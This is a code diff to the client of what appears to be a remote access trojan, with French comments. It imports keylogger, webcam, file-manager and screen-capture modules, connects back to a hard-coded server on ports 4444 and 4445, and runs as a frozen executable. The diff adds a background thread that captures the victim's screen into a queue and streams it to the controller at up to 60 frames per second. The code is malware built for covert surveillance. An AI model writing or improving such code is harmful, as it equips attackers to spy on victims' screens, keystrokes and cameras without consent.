@@ -7,6 +7,7 @@ import platform
 import io
 import time
 import threading
+import queue
 from protocol import send_data, send_base64, receive_data
 from modules import keylogger, screen_capture, file_manager, webcam
 
@@ -14,8 +15,10 @@ if getattr(sys, 'frozen', False):
     os.chdir(sys._MEIPASS)
 
 SERVER_IP = "192.168.1.10"
-PORT = 4444         # Commandes
-PORT_VIDEO = 4445   # Flux vidéo
+PORT = 4444
+PORT_VIDEO = 4445
+
+frame_queue = queue.Queue(maxsize=10)
 
 def connect_to_server(port):
     while True:
@@ -26,19 +29,26 @@ def connect_to_server(port):
         except:
             time.sleep(5)
 
+def capture_frames():
+    while True:
+        try:
+            img = screen_capture.take_screenshot()
+            if frame_queue.full():
+                frame_queue.get()
+            frame_queue.put(img)
+            time.sleep(1/60)
+        except Exception as e:
+            print("[client] Erreur capture:", e)
+
 def stream_screen(s):
     try:
         while True:
             try:
-                img = screen_capture.take_screenshot()
-                print("[client] capture OK - taille:", len(img))
-                send_base64(s, img)
-                time.sleep(1/30)
+                frame = frame_queue.get()
+                send_base64(s, frame)
             except Exception as e:
-                print("[client] Erreur stream:", e)
+                print("[client] Erreur envoi stream:", e)
                 break
-    except Exception as e:
-        print("[client] Stream crashé :", e)
     finally:
         try:
             s.close()
@@ -49,6 +59,7 @@ def start_client():
     s_cmd = connect_to_server(PORT)
     s_video = connect_to_server(PORT_VIDEO)
 
+    threading.Thread(target=capture_frames, daemon=True).start()
     threading.Thread(target=stream_screen, args=(s_video,), daemon=True).start()
 
     while True:
